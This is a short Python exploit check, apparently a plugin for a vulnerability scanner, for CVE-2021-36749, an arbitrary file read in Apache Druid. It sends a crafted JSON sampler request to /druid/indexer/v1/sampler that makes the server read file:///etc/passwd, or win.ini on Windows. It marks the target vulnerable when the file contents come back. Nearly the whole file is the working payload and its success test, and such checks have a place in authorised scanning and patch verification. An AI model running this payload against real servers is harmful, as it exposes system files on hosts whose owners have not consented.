#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/UeE6HWPjh35v4DAshwF4KA',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Apache Druid LoadData 任意文件读取 CVE-2021-36749',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json;charset=UTF-8'
      }
  target = '/druid/indexer/v1/sampler?for=connect'
  data = '{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///etc/passwd"]}}},"samplerConfig":{"numRows":500}}'
  data2 = '{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///c://windows/win.ini"]}}},"samplerConfig":{"numRows":500}}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=8,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    resp=requests.post(url=url1,headers=headers,data=data2,timeout=8,verify=False)
    if resp.status_code == 200 and "for 16-bit app support" in resp.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret